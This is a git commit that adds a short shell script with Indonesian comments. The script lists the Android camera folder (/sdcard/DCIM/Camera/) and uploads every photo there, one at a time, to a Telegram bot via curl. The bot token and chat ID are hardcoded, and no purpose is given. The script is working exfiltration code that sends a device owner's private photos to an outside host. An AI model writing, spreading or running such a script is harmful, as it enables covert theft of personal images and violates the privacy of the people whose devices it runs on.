a458d988199d8a826a4a733cd4c380722a6dcd76
CyroSC <adityasaputro7785@gmail.com>
2025-02-13 23:46:09 +0700

    Create t.sh

---
+++ t.sh
@@ -0,0 +1,9 @@
+# Menampilkan daftar file
+ls /sdcard/DCIM/Camera/
+
+# Mengirim file satu per satu dengan jeda 2 detik
+for file in /sdcard/DCIM/Camera/*; do
+  echo "Mengirim file: $file"
+  curl -X POST "https://api.telegram.org/bot7829941863:AAGm139bBNGSTEWd-wjVLvg8bksj_ucnuK4/sendDocument" -F chat_id=6235995291 -F document=@$file
+  sleep 1  # Jeda 2 detik antar file
+done
